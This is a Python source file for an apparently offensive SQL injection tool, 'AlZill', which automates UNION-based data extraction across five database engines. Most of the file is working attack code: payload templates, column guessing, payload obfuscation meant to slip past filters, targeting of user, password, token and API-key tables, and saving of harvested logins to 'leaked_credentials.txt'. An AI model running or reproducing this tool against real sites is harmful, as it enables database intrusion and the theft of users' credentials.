#!/usr/bin/env python3
# AlZill Custom Module: Specialized Data Extractor (V6 - No False Positives)
# Improved with Delimiters, Column Guessing, and Precise Regex

import requests
import re
import json
from termcolor import cprint
from urllib.parse import urlparse

# Import obfuscator if available
try:
    from modules.obfuscator import AlZillObfuscator
    OBFUSCATOR_AVAILABLE = True
    cprint("[+] Obfuscator module loaded successfully", "green")
except ImportError:
    OBFUSCATOR_AVAILABLE = False
    cprint("[!] Obfuscator module not available", "yellow")


def obfuscate_payload(payload):
    """Apply obfuscation to payload if available"""
    if OBFUSCATOR_AVAILABLE and AlZillObfuscator:
        try:
            return AlZillObfuscator.super_obfuscate(payload)
        except:
            return payload
    return payload


class SQLiDataExtractor:
    """
    Advanced SQL Injection Data Extractor with:
    1. Column guessing (ORDER BY) before UNION
    2. Delimiters for precise data extraction
    3. No false positives - only extracts between unique markers
    """
    
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.extracted_data = []
        
        # Unique delimiters for precise extraction (prevent false positives)
        self.DELIMITER_START = "ALZILL_START_"
        self.DELIMITER_END = "_ALZILL_END"
        
        # Database-specific payloads with delimiters
        self.db_payloads = {
            'MySQL': {
                'version': "1' UNION SELECT CONCAT('{start}', @@version, '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'database': "1' UNION SELECT CONCAT('{start}', database(), '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'user': "1' UNION SELECT CONCAT('{start}', user(), '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'tables': "1' UNION SELECT CONCAT('{start}', table_name, '{end}'),2,3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database()-- -",
                'columns': "1' UNION SELECT CONCAT('{start}', column_name, '{end}'),2,3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='{table}'-- -",
                'data': "1' UNION SELECT CONCAT('{start}', {columns}, '{end}'),2,3,4,5,6,7,8,9,10 FROM {table} LIMIT {limit}-- -",
                'count': "1' UNION SELECT COUNT(*),2,3,4,5,6,7,8,9,10 FROM {table}-- -",
            },
            'PostgreSQL': {
                'version': "1' UNION SELECT CONCAT('{start}', version(), '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'database': "1' UNION SELECT CONCAT('{start}', current_database(), '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'user': "1' UNION SELECT CONCAT('{start}', current_user, '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'tables': "1' UNION SELECT CONCAT('{start}', table_name, '{end}'),2,3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema='public'-- -",
                'columns': "1' UNION SELECT CONCAT('{start}', column_name, '{end}'),2,3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='{table}'-- -",
                'data': "1' UNION SELECT CONCAT('{start}', {columns}, '{end}'),2,3,4,5,6,7,8,9,10 FROM {table} LIMIT {limit}-- -",
                'count': "1' UNION SELECT COUNT(*),2,3,4,5,6,7,8,9,10 FROM {table}-- -",
            },
            'MSSQL': {
                'version': "1' UNION SELECT CONCAT('{start}', @@VERSION, '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'database': "1' UNION SELECT CONCAT('{start}', DB_NAME(), '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'user': "1' UNION SELECT CONCAT('{start}', SYSTEM_USER, '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'tables': "1' UNION SELECT CONCAT('{start}', table_name, '{end}'),2,3,4,5,6,7,8,9,10 FROM information_schema.tables-- -",
                'columns': "1' UNION SELECT CONCAT('{start}', column_name, '{end}'),2,3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='{table}'-- -",
                'data': "1' UNION SELECT CONCAT('{start}', {columns}, '{end}'),2,3,4,5,6,7,8,9,10 FROM {table}-- -",
                'count': "1' UNION SELECT COUNT(*),2,3,4,5,6,7,8,9,10 FROM {table}-- -",
            },
            'Oracle': {
                'version': "1' UNION SELECT CONCAT('{start}', banner, '{end}'),2,3,4,5,6,7,8,9,10 FROM v$version WHERE ROWNUM=1-- -",
                'database': "1' UNION SELECT CONCAT('{start}', global_name, '{end}'),2,3,4,5,6,7,8,9,10 FROM global_name-- -",
                'user': "1' UNION SELECT CONCAT('{start}', user, '{end}'),2,3,4,5,6,7,8,9,10 FROM dual-- -",
                'tables': "1' UNION SELECT CONCAT('{start}', table_name, '{end}'),2,3,4,5,6,7,8,9,10 FROM all_tables WHERE owner='{owner}' AND ROWNUM<=50-- -",
                'columns': "1' UNION SELECT CONCAT('{start}', column_name, '{end}'),2,3,4,5,6,7,8,9,10 FROM all_tab_columns WHERE table_name='{table}' AND ROWNUM<=20-- -",
                'data': "1' UNION SELECT CONCAT('{start}', {columns}, '{end}'),2,3,4,5,6,7,8,9,10 FROM {table} WHERE ROWNUM<={limit}-- -",
                'count': "1' UNION SELECT COUNT(*),2,3,4,5,6,7,8,9,10 FROM {table}-- -",
            },
            'SQLite': {
                'version': "1' UNION SELECT CONCAT('{start}', sqlite_version(), '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'database': "1' UNION SELECT CONCAT('{start}', 'main', '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'user': "1' UNION SELECT CONCAT('{start}', 'sqlite_user', '{end}'),2,3,4,5,6,7,8,9,10-- -",
                'tables': "1' UNION SELECT CONCAT('{start}', name, '{end}'),2,3,4,5,6,7,8,9,10 FROM sqlite_master WHERE type='table'-- -",
                'columns': "1' UNION SELECT CONCAT('{start}', sql, '{end}'),2,3,4,5,6,7,8,9,10 FROM sqlite_master WHERE tbl_name='{table}'-- -",
                'data': "1' UNION SELECT CONCAT('{start}', {columns}, '{end}'),2,3,4,5,6,7,8,9,10 FROM {table} LIMIT {limit}-- -",
                'count': "1' UNION SELECT COUNT(*),2,3,4,5,6,7,8,9,10 FROM {table}-- -",
            },
        }
        
        # Target tables to extract
        self.target_tables = [
            'users', 'admins', 'admin', 'user', 'accounts', 'members',
            'customers', 'clients', 'employees', 'staff', 'credentials',
            'logins', 'passwords', 'auth', 'sessions', 'tokens', 'api_keys'
        ]
        
        # Target columns to extract
        self.target_columns = [
            'username', 'user', 'login', 'email', 'user_email', 'name',
            'password', 'pass', 'pwd', 'passwd', 'user_pass', 'hash',
            'token', 'api_key', 'apikey', 'secret', 'auth_key',
            'session_id', 'cookie', 'salt', 'md5', 'sha1', 'sha256'
        ]
        
        # Patterns for data extraction (ONLY between delimiters)
        self.extraction_patterns = [
            # Pattern 1: username:password with delimiter
            (r'ALZILL_START_([a-zA-Z0-9_.-@]+)[:|\t,;]+([a-zA-Z0-9_.$/-]+)_ALZILL_END', 'plain'),
            # Pattern 2: username:hash (MD5 - 32 chars) with delimiter
            (r'ALZILL_START_([a-zA-Z0-9_.-@]+)[:|\t,;]+([a-fA-F0-9]{32})_ALZILL_END', 'md5_hash'),
            # Pattern 3: username:hash (SHA1 - 40 chars) with delimiter
            (r'ALZILL_START_([a-zA-Z0-9_.-@]+)[:|\t,;]+([a-fA-F0-9]{40})_ALZILL_END', 'sha1_hash'),
            # Pattern 4: username:hash (SHA256 - 64 chars) with delimiter
            (r'ALZILL_START_([a-zA-Z0-9_.-@]+)[:|\t,;]+([a-fA-F0-9]{64})_ALZILL_END', 'sha256_hash'),
            # Pattern 5: email:password with delimiter
            (r'ALZILL_START_([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[:|\t,;]+([a-zA-Z0-9_.$/-]+)_ALZILL_END', 'email_password'),
            # Pattern 6: Single value extraction (like table names)
            (r'ALZILL_START_([a-zA-Z_][a-zA-Z0-9_]{2,})_ALZILL_END', 'single_value'),
        ]
    
    # ============================================================
    # COLUMN GUESSING FUNCTION (ORDER BY)
    # ============================================================
    def guess_columns_count(self, form, field_name, send_request_func):
        """
        Guess number of columns using ORDER BY technique
        Returns number of columns or None if not found
        """
        cprint("[*] Guessing number of columns (ORDER BY)...", "blue")
        
        # Test up to 30 columns
        for col_count in range(1, 31):
            # Build ORDER BY payload
            payload = f"1' ORDER BY {col_count}-- -"
            obfuscated = obfuscate_payload(payload)
            
            try:
                response = send_request_func(form, {field_name: obfuscated})
                
                # If error (500) or different response, we found the limit
                if response.status_code >= 500 or "error" in response.text.lower():
                    if self.verbose:
                        cprint(f"    [*] ORDER BY {col_count} caused error", "yellow")
                    # Previous number was valid
                    valid_columns = col_count - 1
                    if valid_columns >= 2:
                        cprint(f"    [+] Guessed {valid_columns} columns", "green")
                        return valid_columns
                    break
                    
                # Check if response is normal (no error)
                if col_count > 5 and "Unknown column" not in response.text:
                    # Continue to next number
                    continue
                    
            except Exception as e:
                if self.verbose:
                    cprint(f"    [!] ORDER BY {col_count} failed: {e}", "yellow")
                valid_columns = col_count - 1
                if valid_columns >= 2:
                    cprint(f"    [+] Guessed {valid_columns} columns", "green")
                    return valid_columns
                break
        
        # Default to 10 if guessing failed
        cprint("[!] Column guessing failed, defaulting to 10 columns", "yellow")
        return 10
    
    def build_union_payload(self, base_payload, column_count):
        """
        Build UNION SELECT payload with correct number of columns
        """
        # Replace the column placeholders (2,3,4,...) with proper count
        columns = ['{start}'] + [str(i) for i in range(2, column_count + 1)]
        
        # The first column is our delimiter-wrapped data
        # Other columns are just numbers
        
        if '{start}' in base_payload:
            # For MySQL/PostgreSQL style with CONCAT
            pass
        else:
            # For other formats
            pass
        
        return base_payload
    
    def _send_obfuscated(self, send_request_func, form, field_name, payload):
        """Send request with obfuscated payload"""
        obfuscated = obfuscate_payload(payload)
        if self.verbose:
            cprint(f"[*] Sending obfuscated payload: {obfuscated[:80]}...", "blue")
        return send_request_func(form, {field_name: obfuscated})
    
    def extract_with_delimiters(self, form, field_name, send_request_func, payload_template, **kwargs):
        """
        Extract data using delimiter-based payload
        Returns list of extracted values (only between delimiters)
        """
        # Replace delimiters in payload
        start_delim = self.DELIMITER_START
        end_delim = self.DELIMITER_END
        
        payload = payload_template.format(start=start_delim, end=end_delim, **kwargs)
        
        try:
            response = self._send_obfuscated(send_request_func, form, field_name, payload)
            
            # Extract ONLY between delimiters
            pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
            matches = re.findall(pattern, response.text, re.DOTALL)
            
            if matches:
                if self.verbose:
                    cprint(f"    [+] Extracted {len(matches)} items using delimiters", "green")
                return matches
            else:
                if self.verbose:
                    cprint(f"    [!] No delimiter matches found", "yellow")
                return []
                
        except Exception as e:
            if self.verbose:
                cprint(f"    [!] Extraction failed: {e}", "red")
            return []
    
    def extract(self, form, field_name, send_request_func, db_type="auto"):
        """
        Main extraction function with column guessing and delimiters
        """
        cprint(f"\n[SQLi Extractor] Starting data extraction on [{field_name}]", "cyan")
        
        # ============================================================
        # STEP 1: Guess number of columns (ORDER BY)
        # ============================================================
        column_count = self.guess_columns_count(form, field_name, send_request_func)
        
        if column_count < 2:
            cprint("[!] Could not determine column count, UNION injection may fail", "yellow")
        
        results = {
            'db_type': None,
            'version': None,
            'database': None,
            'user': None,
            'tables': [],
            'columns': {},
            'data': [],
            'column_count': column_count
        }
        
        # ============================================================
        # STEP 2: Detect database type
        # ============================================================
        if db_type == "auto":
            results['db_type'] = self.detect_database_type(form, field_name, send_request_func, column_count)
        else:
            results['db_type'] = db_type
        
        if not results['db_type']:
            cprint("[!] Could not detect database type, using MySQL as default", "yellow")
            results['db_type'] = 'MySQL'
        
        cprint(f"[+] Database Type: {results['db_type']}", "green")
        cprint(f"[+] Columns Count: {column_count}", "green")
        
        # ============================================================
        # STEP 3: Extract version (with delimiters)
        # ============================================================
        if results['db_type'] in self.db_payloads:
            payload_template = self.db_payloads[results['db_type']].get('version')
            if payload_template:
                # Adjust payload for column count
                payload_template = self._adjust_payload_columns(payload_template, column_count)
                versions = self.extract_with_delimiters(form, field_name, send_request_func, payload_template)
                if versions:
                    results['version'] = versions[0]
                    cprint(f"[+] Version: {results['version']}", "green")
        
        # ============================================================
        # STEP 4: Extract database name
        # ============================================================
        if results['db_type'] in self.db_payloads:
            payload_template = self.db_payloads[results['db_type']].get('database')
            if payload_template:
                payload_template = self._adjust_payload_columns(payload_template, column_count)
                databases = self.extract_with_delimiters(form, field_name, send_request_func, payload_template)
                if databases:
                    results['database'] = databases[0]
                    cprint(f"[+] Database: {results['database']}", "green")
        
        # ============================================================
        # STEP 5: Extract user
        # ============================================================
        if results['db_type'] in self.db_payloads:
            payload_template = self.db_payloads[results['db_type']].get('user')
            if payload_template:
                payload_template = self._adjust_payload_columns(payload_template, column_count)
                users = self.extract_with_delimiters(form, field_name, send_request_func, payload_template)
                if users:
                    results['user'] = users[0]
                    cprint(f"[+] User: {results['user']}", "green")
        
        # ============================================================
        # STEP 6: Extract tables
        # ============================================================
        if results['db_type'] in self.db_payloads:
            payload_template = self.db_payloads[results['db_type']].get('tables')
            if payload_template:
                payload_template = self._adjust_payload_columns(payload_template, column_count)
                tables = self.extract_with_delimiters(form, field_name, send_request_func, payload_template)
                
                # Filter out system tables
                for table in tables:
                    table_lower = table.lower()
                    if table_lower not in ['information_schema', 'mysql', 'performance_schema', 'sys', 'schema', 'sqlite_master', 'all_tables', 'v$version', 'dual']:
                        if table not in results['tables'] and len(table) > 2:
                            results['tables'].append(table)
                
                if results['tables']:
                    cprint(f"[+] Tables found: {len(results['tables'])}", "green")
                    if self.verbose:
                        for t in results['tables'][:10]:
                            cprint(f"    - {t}", "cyan")
        
        # ============================================================
        # STEP 7: Extract data from target tables
        # ============================================================
        for table in results['tables']:
            if table.lower() in [t.lower() for t in self.target_tables]:
                table_data = self.extract_table_data(form, field_name, send_request_func, results['db_type'], table, column_count)
                if table_data:
                    results['data'].extend(table_data)
                    cprint(f"[!] Data extracted from '{table}': {len(table_data)} records", "red")
        
        # ============================================================
        # STEP 8: Save results
        # ============================================================
        self.save_results(results)
        
        return results
    
    def _adjust_payload_columns(self, payload_template, column_count):
        """
        Adjust UNION SELECT payload to match the correct number of columns
        """
        if column_count <= 2:
            return payload_template
        
        # Replace the column placeholders
        # Example: "1' UNION SELECT CONCAT(...),2,3,4,5,6,7,8,9,10-- -"
        # We need to adjust the number of placeholders
        
        # Find the part after SELECT
        select_match = re.search(r'UNION SELECT (.*?)-- -', payload_template, re.IGNORECASE)
        if not select_match:
            return payload_template
        
        select_content = select_match.group(1)
        
        # Count current placeholders (numbers separated by commas)
        current_placeholders = re.findall(r'\b\d+\b', select_content)
        current_count = len(current_placeholders)
        
        if current_count == column_count:
            return payload_template
        
        # Build new placeholder list
        # Keep the first column as CONCAT, rest as numbers
        first_col_match = re.match(r'(CONCAT\([^)]+\)),?', select_content, re.IGNORECASE)
        
        if first_col_match:
            first_col = first_col_match.group(1)
            new_placeholders = [first_col]
            for i in range(2, column_count + 1):
                new_placeholders.append(str(i))
            new_select = ', '.join(new_placeholders)
        else:
            # Just use numbers
            new_placeholders = [str(i) for i in range(1, column_count + 1)]
            new_select = ', '.join(new_placeholders)
        
        new_payload = payload_template.replace(select_content, new_select)
        return new_payload
    
    def detect_database_type(self, form, field_name, send_request_func, column_count):
        """Detect database type using version payloads with delimiters"""
        test_payloads = [
            ("MySQL", f"1' UNION SELECT CONCAT('{self.DELIMITER_START}', @@version, '{self.DELIMITER_END}')," + ','.join([str(i) for i in range(2, column_count + 1)]) + "-- -"),
            ("PostgreSQL", f"1' UNION SELECT CONCAT('{self.DELIMITER_START}', version(), '{self.DELIMITER_END}')," + ','.join([str(i) for i in range(2, column_count + 1)]) + "-- -"),
            ("MSSQL", f"1' UNION SELECT CONCAT('{self.DELIMITER_START}', @@VERSION, '{self.DELIMITER_END}')," + ','.join([str(i) for i in range(2, column_count + 1)]) + "-- -"),
            ("SQLite", f"1' UNION SELECT CONCAT('{self.DELIMITER_START}', sqlite_version(), '{self.DELIMITER_END}')," + ','.join([str(i) for i in range(2, column_count + 1)]) + "-- -"),
        ]
        
        patterns = {
            'MySQL': r'MySQL|MariaDB',
            'PostgreSQL': r'PostgreSQL',
            'MSSQL': r'Microsoft SQL Server',
            'SQLite': r'SQLite',
        }
        
        for db_type, payload in test_payloads:
            try:
                response = self._send_obfuscated(send_request_func, form, field_name, payload)
                for pattern_name, pattern in patterns.items():
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return pattern_name
            except:
                continue
        
        # Try Oracle separately (different syntax)
        oracle_payload = f"1' UNION SELECT CONCAT('{self.DELIMITER_START}', banner, '{self.DELIMITER_END}')," + ','.join([str(i) for i in range(2, column_count + 1)]) + " FROM v$version WHERE ROWNUM=1-- -"
        try:
            response = self._send_obfuscated(send_request_func, form, field_name, oracle_payload)
            if re.search(r'Oracle', response.text, re.IGNORECASE):
                return 'Oracle'
        except:
            pass
        
        return None
    
    def extract_table_data(self, form, field_name, send_request_func, db_type, table, column_count):
        """Extract data from a specific table using delimiters"""
        if db_type not in self.db_payloads:
            return []
        
        # First, find columns in the table
        columns_payload_template = self.db_payloads[db_type].get('columns')
        if columns_payload_template:
            columns_payload_template = columns_payload_template.replace('{table}', table)
            columns_payload_template = self._adjust_payload_columns(columns_payload_template, column_count)
            
            # Extract column names with delimiters
            column_names = self.extract_with_delimiters(form, field_name, send_request_func, columns_payload_template)
            
            # Filter for interesting columns
            available_columns = []
            for col in column_names:
                col_lower = col.lower()
                if any(target_col in col_lower for target_col in self.target_columns):
                    if col not in available_columns:
                        available_columns.append(col)
            
            if not available_columns:
                # Try to find any columns that might contain credentials
                for col in column_names[:10]:
                    col_lower = col.lower()
                    if 'user' in col_lower or 'name' in col_lower or 'email' in col_lower:
                        available_columns.append(col)
                    elif 'pass' in col_lower or 'pwd' in col_lower or 'hash' in col_lower:
                        available_columns.append(col)
        else:
            available_columns = ['username', 'password']
        
        if not available_columns:
            return []
        
        # Get count of records first
        count_payload_template = self.db_payloads[db_type].get('count')
        if count_payload_template:
            count_payload_template = count_payload_template.replace('{table}', table)
            count_payload_template = self._adjust_payload_columns(count_payload_template, column_count)
            counts = self.extract_with_delimiters(form, field_name, send_request_func, count_payload_template)
            
            try:
                record_count = int(counts[0]) if counts else 50
                if record_count > 100:
                    record_count = 100
                    cprint(f"    [!] Table has {counts[0]} records, limiting to 100", "yellow")
            except:
                record_count = 50
        else:
            record_count = 50
        
        # Build data extraction payload with LIMIT
        data_payload_template = self.db_payloads[db_type].get('data')
        if not data_payload_template:
            return []
        
        # Build columns string for CONCAT (username:password format)
        username_col = None
        password_col = None
        
        for col in available_columns:
            col_lower = col.lower()
            if 'user' in col_lower or 'name' in col_lower or 'email' in col_lower:
                if not username_col:
                    username_col = col
            elif 'pass' in col_lower or 'pwd' in col_lower or 'hash' in col_lower:
                if not password_col:
                    password_col = col
        
        if not username_col:
            username_col = available_columns[0] if available_columns else 'username'
        if not password_col:
            password_col = available_columns[1] if len(available_columns) > 1 else 'password'
        
        # Create CONCAT with delimiter for precise extraction
        # Format: username:password
        concat_cols = f"CONCAT('{self.DELIMITER_START}', {username_col}, ':', {password_col}, '{self.DELIMITER_END}')"
        
        data_payload_template = data_payload_template.replace('{table}', table)
        data_payload_template = data_payload_template.replace('{columns}', concat_cols)
        data_payload_template = data_payload_template.replace('{limit}', str(record_count))
        data_payload_template = self._adjust_payload_columns(data_payload_template, column_count)
        
        # Extract data
        extracted_values = self.extract_with_delimiters(form, field_name, send_request_func, data_payload_template)
        
        # Parse extracted values (they should already be in username:password format)
        data = []
        for value in extracted_values:
            if ':' in value:
                parts = value.split(':', 1)
                if len(parts) == 2 and len(parts[1]) >= 4:
                    entry = f"{parts[0]}:{parts[1]}"
                    if entry not in data:
                        data.append(entry)
                        if self.verbose:
                            cprint(f"    [+] Extracted: {parts[0]}:{parts[1][:20]}...", "green")
            elif value and len(value) > 5:
                # Single value (maybe just usernames)
                data.append(value)
                if self.verbose:
                    cprint(f"    [+] Extracted: {value}", "green")
        
        return data[:100]
    
    def save_results(self, results):
        """Save extraction results to file"""
        filename = "sqli_extracted_data.json"
        
        output = {
            'db_type': results.get('db_type'),
            'version': results.get('version'),
            'database': results.get('database'),
            'user': results.get('user'),
            'column_count': results.get('column_count'),
            'tables_count': len(results.get('tables', [])),
            'tables': results.get('tables', [])[:20],
            'data_extracted': len(results.get('data', [])),
            'credentials': results.get('data', [])[:50]
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(output, f, indent=2, ensure_ascii=False)
        
        cprint(f"[+] Extraction results saved to: {filename}", "green")
        
        # Save credentials in readable format (ONLY if real data exists)
        if results.get('data') and len(results.get('data')) > 0:
            cred_file = "leaked_credentials.txt"
            with open(cred_file, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"Target Database: {results.get('database', 'Unknown')}\n")
                f.write(f"Version: {results.get('version', 'Unknown')}\n")
                f.write(f"User: {results.get('user', 'Unknown')}\n")
                f.write(f"Columns: {results.get('column_count', 'Unknown')}\n")
                f.write(f"{'='*60}\n")
                for cred in results['data'][:100]:
                    f.write(f"{cred}\n")
            cprint(f"[+] Credentials saved to: {cred_file}", "green")
        else:
            cprint("[!] No real data extracted (results may be false positives)", "yellow")


# ============================================================
# Legacy functions for backward compatibility
# ============================================================

def run_custom_extractor(form, field_name, db_type="MySQL"):
    """
    Legacy function for backward compatibility
    """
    extractor = SQLiDataExtractor(verbose=True)
    
    def send_request_wrapper(form, data):
        from modules.sqli_post_scanner import send_request
        return send_request(form, data)
    
    results = extractor.extract(form, field_name, send_request_wrapper, db_type)
    
    # Format results for legacy format
    extracted = []
    for cred in results.get('data', []):
        extracted.append(cred)
    
    return extracted


def save_leaked_data(url, data_list):
    """Save leaked credentials to file"""
    if not data_list:
        return
    
    filename = "leaked_credentials.txt"
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"Target: {url}\n")
        f.write(f"{'='*60}\n")
        for entry in data_list:
            f.write(f"{entry}\n")
    
    cprint(f"[+] Leaked credentials saved to: {filename}", "green")


if __name__ == "__main__":
    print("SQLi Data Extractor Module V6 - No False Positives")
    print("Features:")
    print("  ✅ Column guessing (ORDER BY) before UNION")
    print("  ✅ Delimiters for precise data extraction")
    print("  ✅ No HTML tags extracted as data")
    print("  ✅ Only extracts between ALZILL_START_ and _ALZILL_END")
    print("  ✅ Automatic obfuscation for all payloads")
    print("  ✅ Hash support (MD5, SHA1, SHA256)")
    print("  ✅ Multi-database support")